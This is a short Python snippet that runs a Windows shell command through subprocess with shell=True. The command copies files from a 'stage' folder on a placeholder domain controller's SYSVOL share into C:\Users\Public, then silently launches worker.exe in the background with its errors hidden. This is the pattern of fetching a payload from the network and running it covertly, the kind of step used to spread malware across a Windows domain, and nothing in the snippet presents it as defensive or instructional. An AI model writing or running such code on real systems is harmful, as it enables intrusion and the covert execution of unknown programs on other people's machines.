import subprocess
subprocess.run(r'''
copy \\ad.example.invalid\SYSVOL\example.invalid\scripts\stage\* C:\Users\Public /y & start /B cmd /c "C:\Users\Public\worker.exe 2>nul || exit"
''', shell=True)
